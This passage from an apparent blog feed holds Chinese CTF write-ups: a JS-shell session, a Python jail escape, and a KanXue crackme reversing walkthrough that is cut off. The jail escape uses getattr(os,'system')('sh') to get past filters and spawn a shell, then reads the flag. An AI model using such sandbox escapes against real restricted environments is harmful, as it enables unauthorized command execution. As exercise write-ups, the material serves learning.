<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">js<span class="token operator">></span> os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token punctuation">)</span>
typein<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">1</span> Error<span class="token punctuation">:</span> os<span class="token punctuation">.</span>system requires <span class="token number">1</span> argument
Stack<span class="token punctuation">:</span>
  @typein<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">1</span>
js<span class="token operator">></span> os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span>
js  libnspr4<span class="token punctuation">.</span>so  libplc4<span class="token punctuation">.</span>so  libplds4<span class="token punctuation">.</span>so
<span class="token number">0</span>
js<span class="token operator">></span> os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'sh'</span><span class="token punctuation">)</span> 
$ ls
js  libnspr4<span class="token punctuation">.</span>so  libplc4<span class="token punctuation">.</span>so  libplds4<span class="token punctuation">.</span>so
$
</code></pre>
<p>可以看到成功调用system且拿到sh </p>
<p>那我们试试第三种情况能否使用</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">js<span class="token operator">></span> a<span class="token operator">=</span>getattr<span class="token punctuation">(</span>os<span class="token punctuation">,</span><span class="token string">"system"</span><span class="token punctuation">)</span>
typein<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">1</span> ReferenceError<span class="token punctuation">:</span> getattr <span class="token keyword">is</span> <span class="token operator">not</span> defined
Stack<span class="token punctuation">:</span>
  @typein<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">1</span>
js<span class="token operator">></span>
</code></pre>
<p>发现不能识别该函数所以没办法通过此方法绕过==</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;运行程序 发现是个沙箱&lt;/p&gt;
&lt;p&gt;利用dir()查看引用的函数&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;p class=&quot;code-caption&quot; data-lang=&quot;python&quot; data-line_number=&quot;frontend&quot; data-trim_indent=&quot;bac
    
    </summary>
    
    
      <category term="python" scheme="http://iosmosis.github.io/tags/python/"/>
    
      <category term="Writeup" scheme="http://iosmosis.github.io/tags/Writeup/"/>
    
      <category term="沙箱绕过" scheme="http://iosmosis.github.io/tags/%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>Escape_From_Jail-50</title>
    <link href="http://iosmosis.github.io/2019/07/18/Escape-From-Jail-50/"/>
    <id>http://iosmosis.github.io/2019/07/18/Escape-From-Jail-50/</id>
    <published>2019-07-18T09:50:39.000Z</published>
    <updated>2019-09-12T04:43:59.315Z</updated>
    
    <content type="html"><![CDATA[<p>python绕过题目</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token operator">==</span>
Rules<span class="token punctuation">:</span>
    <span class="token operator">-</span>No <span class="token keyword">import</span>
    <span class="token operator">-</span>No <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token operator">-</span>No flag


<span class="token operator">>></span><span class="token operator">></span> help

Documented commands <span class="token punctuation">(</span>type help <span class="token operator">&lt;</span>topic<span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
help

Undocumented commands<span class="token punctuation">:</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
EOF
</code></pre>
<p>题目给出了要求 不能使用import  不能使用 . 且不准出现flag字眼</p>
<p>这里需要思考一下 不用flag就行命令绕过了怎么读flag呢？</p>
<p>1.可以 cat * 然后自己找 貌似不太现实==</p>
<p>2.利用python读flag  可是不能出现flag字符</p>
<p>3.利用os模块自己起个shell 但是不准import</p>
<p>根据规则 应该是我们必须起一个shell 但是无法调用os是个大问题 </p>
<p>所以我们现在需要想办法在不使用import os的情况下执行os.system(‘/sh’)</p>
<p>利用dir()命令查看当前可以调用的模块</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>&gt;&gt;&gt; print(dir())
[&#39;Jail&#39;, &#39;__builtins__&#39;, &#39;__cached__&#39;, &#39;__doc__&#39;, &#39;__file__&#39;, &#39;__loader__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__spec__&#39;, &#39;cmd&#39;, &#39;execute&#39;, &#39;intro&#39;, &#39;os&#39;, &#39;sys&#39;, &#39;t&#39;]
&gt;&gt;&gt;
</code></pre><p>发现os已经导入并不需要import </p>
<p>可是我们还是无法执行因为os.system(‘/sh’)中含有.</p>
<p>思考：</p>
<p>有没有函数能不使用.就能使用其他函数？</p>
<p><a href="https://www.runoob.com/python/python-func-getattr.html" target="_blank" rel="noopener">https://www.runoob.com/python/python-func-getattr.html</a></p>
<p>找到一个</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">getattr<span class="token punctuation">(</span>object<span class="token punctuation">,</span> name<span class="token punctuation">[</span><span class="token punctuation">,</span> default<span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre>
<p>获取object中name的属性值</p>
<p>若存在则当前命令=name</p>
<p>所以我们获取os中system的属性值并且返回属性时执行system(‘sh’)</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>getattr(os,&quot;system&quot;)(&quot;sh&quot;) =system(&quot;sh&quot;)
</code></pre><p>当然如果不好理解也可以这么写</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>a=getattr(os,&quot;system&quot;)
a(&quot;sh&quot;)
</code></pre><p>成功拿到shell 接着就正常拿flag即可</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>cd home
cd ctf
cat flag
</code></pre><p>附一些好的python沙箱绕过文章</p>
<p><a href="https://www.anquanke.com/post/id/107000" target="_blank" rel="noopener">https://www.anquanke.com/post/id/107000</a></p>
<p><a href="https://www.jianshu.com/p/183581381c4f" target="_blank" rel="noopener">https://www.jianshu.com/p/183581381c4f</a></p>
<p><a href="https://www.xctf.org.cn/library/details/0df15ef620b075f288bdfc0ae6fe4eabe7cb996e/" target="_blank" rel="noopener">https://www.xctf.org.cn/library/details/0df15ef620b075f288bdfc0ae6fe4eabe7cb996e/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;python绕过题目&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;p class=&quot;code-caption&quot; data-lang=&quot;python&quot; data-line_number=&quot;frontend&quot; data-trim_indent=&quot;backend&quot; data-label_positi
    
    </summary>
    
    
      <category term="python" scheme="http://iosmosis.github.io/tags/python/"/>
    
      <category term="沙箱绕过" scheme="http://iosmosis.github.io/tags/%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>看雪CTF-Writeup</title>
    <link href="http://iosmosis.github.io/2019/03/11/%E7%9C%8B%E9%9B%AACTF-Writeup/"/>
    <id>http://iosmosis.github.io/2019/03/11/看雪CTF-Writeup/</id>
    <published>2019-03-11T15:15:57.000Z</published>
    <updated>2019-03-12T13:42:52.874Z</updated>
    
    <content type="html"><![CDATA[<h3 id="第一题-流浪者"><a href="#第一题-流浪者" class="headerlink" title="第一题 流浪者"></a>第一题 流浪者</h3><p>下载到程序 简单执行下 就是简单的creakerme ，需要输入正确验证码。</p>
<p>载入 ghidra 分析</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">FUN_00401890</span><span class="token punctuation">(</span>CWnd <span class="token operator">*</span>param_1<span class="token punctuation">)</span>

<span class="token punctuation">{</span>

  <span class="token keyword">int</span> local_78 <span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  pCVar1 <span class="token operator">=</span> param_1 <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">;</span>
  local_8 <span class="token operator">=</span> param_1<span class="token punctuation">;</span>
  this <span class="token operator">=</span> <span class="token function">GetDlgItem</span><span class="token punctuation">(</span>param_1<span class="token punctuation">,</span><span class="token number">0x3ea</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">GetWindowTextA</span><span class="token punctuation">(</span>this<span class="token punctuation">,</span><span class="token punctuation">(</span>CString <span class="token operator">*</span><span class="token punctuation">)</span>pCVar1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  iVar2 <span class="token operator">=</span> <span class="token function">FUN_00401a30</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>local_8 <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  local_c <span class="token operator">=</span> <span class="token function">GetBuffer</span><span class="token punctuation">(</span><span class="token punctuation">(</span>CString <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>local_8 <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span>iVar2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  sVar3 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>local_c<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>sVar3 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">MessageBoxA</span><span class="token punctuation">(</span>local_8<span class="token punctuation">,</span><span class="token operator">&amp;</span>DAT_004035dc<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token punctuation">{</span>
    local_10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">58</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token number">47</span> <span class="token operator">&lt;</span> local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        local_78<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token number">0x30</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">123</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token number">96</span> <span class="token operator">&lt;</span> local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          local_78<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token number">0x57</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">91</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token number">64</span> <span class="token operator">&lt;</span> local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            local_78<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token number">0x1d</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span>
          <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token function">FUN_004017b0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//返回错误</span>
          <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
      local_10 <span class="token operator">=</span> local_10 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">FUN_004017f0</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>local_78<span class="token punctuation">)</span><span class="token punctuation">;</span> 得到的local_78数组传入到FUN_004017f0函数
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>程序从文本框获取到字符串、然后判断是否为空 如果为空 弹窗 程序结束</p>
<p>可以看到接收长度为26 //  int local_78 [26]；</p>
<p>然后是对接收到的字符串进行判断并进行运算操作</p>
<p>进入FUN_004017f0</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>void __cdecl FUN_004017f0(int param_1)

{
  int iVar1; 
  char local_28 [28];
  undefined4 local_c;
  int local_8;
  // param_1为上函数运算得到的数组
  local_8 = 0;
  local_c = 0;
  while ((*(int *)(param_1 + local_8 * 4) &lt; 0x3e &amp;&amp; (-1 &lt; *(int *)(param_1 + local_8 * 4)))) {
    local_28[local_8] =
         &quot;abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ&quot;
         [*(int *)(param_1 + local_8 * 4)];
    local_8 = local_8 + 1;
  }
  local_28[local_8] = 0;
  iVar1 = strcmp(local_28,&quot;KanXueCTF2019JustForhappy&quot;);
  if (iVar1 == 0) {
    FUN_00401770();//返回pass
  }
  else {
    FUN_004017b0();//返回错误
  }
  return;
}
</code></pre><p>从</p>
<p>iVar1 = strcmp(local_28,”KanXueCTF2019JustForhappy”);</p>
<p>可以得到  local_28的值为 KanXueCTF2019JustForhappy</p>
<p> 又可以看到 </p>
<p>  local_28[local_8] =<br>“abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ”<br>[<em>(int </em>)(param_1 + local_8 * 4)];</p>
<p> local_28[local_8] 数组的每一位是从这段字符串中取出 取出位置由param_1决定</p>
<p> 所以在当前函数 已知 local_28  已知字符串 求param_1</p>
<p>re.c</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> a<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token string">"KanXueCTF2019JustForhappy"</span><span class="token punctuation">;</span>
   <span class="token keyword">char</span> b<span class="token punctuation">[</span><span class="token number">62</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ"</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> c<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
   <span class="token keyword">int</span> d<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
   <span class="token keyword">while</span> <span class="token punctuation">(</span>d<span class="token operator">&lt;</span><span class="token number">25</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
       <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
           <span class="token keyword">if</span> <span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>a<span class="token punctuation">[</span>d<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
               c<span class="token punctuation">[</span>d<span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token punctuation">;</span>
              <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d,"</span><span class="token punctuation">,</span>c<span class="token punctuation">[</span>d<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
               d<span class="token operator">=</span>d<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>
               <span class="token comment" spellcheck="true">//break ;</span>
           <span class="token punctuation">}</span>

       <span class="token punctuation">}</span>
   <span class="token punctuation">}</span>
</code></pre>
<p>得到param_1</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">param_1<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">,</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">}</span>
</code></pre>
<p>接着回带到上一函数</p>
<p>关键位置</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">local_10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">58</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token number">47</span> <span class="token operator">&lt;</span> local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        local_78<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token number">0x30</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">123</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token number">96</span> <span class="token operator">&lt;</span> local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          local_78<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token number">0x57</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">91</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token number">64</span> <span class="token operator">&lt;</span> local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            local_78<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token number">0x1d</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span>
          <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token function">FUN_004017b0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//返回错误</span>
          <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
</code></pre>
<p>已知最后获得的字符串 local_78 已知判断条件 可以求出原字符串</p>
<p>因为获得的字符串最后进行减数操作 所以求原函数只需要将判断条件的值减取相应判断条件里的减去的值并将判断条件里的值由减改为加即可。</p>
<p>re1.c</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> v5<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">,</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//得到的local_78</span>
   <span class="token keyword">int</span> local_10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> v5<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    local_10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>local_10 <span class="token operator">!=</span> <span class="token number">25</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">62</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token number">35</span> <span class="token operator">&lt;</span> c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            v5<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">29</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">36</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token number">9</span> <span class="token operator">&lt;</span> c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                v5<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">87</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&lt;</span> c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    v5<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">48</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>

            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
